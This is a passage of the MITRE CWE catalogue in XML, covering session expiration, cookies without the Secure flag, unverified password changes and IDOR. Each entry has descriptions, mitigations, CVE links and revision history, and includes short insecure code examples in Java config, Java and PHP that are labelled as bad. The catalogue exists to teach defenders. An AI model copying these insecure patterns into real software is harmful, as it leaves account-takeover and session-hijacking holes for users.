            <Previous_Entry_Name Date="2013-02-21">Information Exposure Through XML External Entity Reference</Previous_Entry_Name>
			<Previous_Entry_Name Date="2019-06-20">Improper Restriction of XML External Entity Reference ('XXE')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="613" Name="Insufficient Session Expiration" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>According to WASC, "Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization."</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="672" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="287" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Set sessions/credentials expiration date.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following snippet was taken from a J2EE web.xml deployment descriptor in which the session-timeout parameter is explicitly defined (the default value depends on the container). In this case the value is set to -1, which means that a session will never expire.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>&lt;web-app&gt;<xhtml:div style="margin-left:1em;">
                        <xhtml:div>[...snipped...]<xhtml:br/>
                           <xhtml:br/>&lt;session-config&gt;<xhtml:div style="margin-left:1em;">&lt;session-timeout&gt;-1&lt;/session-timeout&gt;</xhtml:div>&lt;/session-config&gt;</xhtml:div>
                     </xhtml:div>&lt;/web-app&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>47</Entry_ID>
               <Entry_Name>Insufficient Session Expiration</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Other">The lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>WASC</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="614" Name="Sensitive Cookie in HTTPS Session Without 'Secure' Attribute" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="319" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Always set the secure attribute when the cookie should sent via HTTPS only.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The snippet of code below, taken from a servlet doPost() method, sets an accountID cookie (sensitive) without calling setSecure(true).</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie c = new Cookie(ACCOUNT_ID, acctID);<xhtml:br/>response.addCookie(c);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-0462</Reference>
               <Description>A product does not set the Secure attribute for sensitive cookies in HTTPS sessions, which could cause the user agent to send those cookies in plaintext over an HTTP session with the product.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0462</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3663</Reference>
               <Description>A product does not set the secure flag for the session cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3663</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3662</Reference>
               <Description>A product does not set the secure flag for the session cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3662</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0128</Reference>
               <Description>A product does not set the secure flag for a cookie in an https session, which can cause the cookie to be sent in http requests and make it easier for remote attackers to capture this cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0128</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Unset Secure Attribute for Sensitive Cookies in HTTPS Session</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="620" Name="Unverified Password Change" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.</Description>
         <Extended_Description>This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When prompting for a password change, force the user to provide the original password in addition to the new password.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use "forgotten password" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:1em;">SetUserPassword($user, $pass);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0944</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP31</Entry_ID>
               <Entry_Name>Missing authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2007-05-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="639" Name="Authorization Bypass Through User-Controlled Key" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.</Description>
         <Extended_Description>
            <xhtml:p>Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.</xhtml:p>
            <xhtml:p>For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.</xhtml:p>
            <xhtml:p>One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1003" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference / IDOR</Term>
               <Description>The "Insecure Direct Object Reference" term, as described in the OWASP Top Ten, is broader than this CWE because it also covers path traversal (CWE-22). Within the context of vulnerability theory, there is a similarity between the OWASP concept and CWE-706: Use of Incorrectly-Resolved Name or Reference.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Broken Object Level Authorization / BOLA</Term>
               <Description>BOLA is used in the 2019 OWASP API Security Top 10 and is said to be the same as IDOR.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Horizontal Authorization</Term>
               <Description>"Horizontal Authorization" is used to describe situations in which two users have the same privilege level, but must be prevented from accessing each other's resources. This is fairly common when using key-based access to resources in a multi-user context.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Access control checks for specific user data or functionality can be bypassed.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Horizontal escalation of privilege is possible (one user can view/modify information of another user).</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Vertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Access Control Bypass Through User-Controlled Key</Previous_Entry_Name>
         </Content_History>
      </Weakness>
